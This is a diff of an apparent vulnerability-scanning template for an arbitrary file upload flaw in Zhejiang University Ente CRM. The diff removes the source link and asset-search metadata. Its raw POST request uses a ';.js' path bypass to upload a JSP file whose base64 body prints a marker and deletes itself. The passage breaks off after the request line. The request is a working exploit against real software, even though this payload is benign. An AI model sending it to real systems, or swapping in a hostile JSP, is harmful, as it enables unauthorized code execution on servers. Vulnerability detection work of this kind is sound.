@@ -3,14 +3,8 @@ info:
   name: 浙大恩特CRMsaveFileByPhone任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/5b88cbfd3be0068fd6369e8b79cd9063
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 5b88cbfd3be0068fd6369e8b79cd9063
-    fofa: + hunter`app.name="浙大恩特 CRM"`
 http:
 - raw:
   - 'POST /entsoft/ProductAction.entphone;.js?method=saveFileByPhone&goonum=954572337&filename=usnw9.jsp&imageData=Ijwlb3V0LnByaW50KDEyNTQxMjU2Mik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPiI= HTTP/1.1
